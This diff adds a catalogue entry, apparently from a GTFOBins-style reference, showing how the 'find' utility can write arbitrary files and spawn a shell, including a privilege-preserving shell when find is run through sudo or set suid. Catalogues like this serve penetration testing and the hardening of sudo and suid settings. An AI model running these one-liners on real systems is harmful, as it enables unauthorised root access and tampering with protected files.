@@ -1,0 +1,22 @@
+---
+functions:
+  file-write:
+  - code: |-
+      find / -fprintf /path/to/output-file DATA -quit
+    comment: |-
+      `DATA` is a format string, it supports some escape sequences.
+    contexts:
+      sudo:
+      suid:
+      unprivileged:
+  shell:
+  - code: |-
+      find . -exec /bin/sh \; -quit
+    contexts:
+      sudo:
+      suid:
+        code: |-
+          find . -exec /bin/sh -p \; -quit
+        shell: false
+      unprivileged:
+...
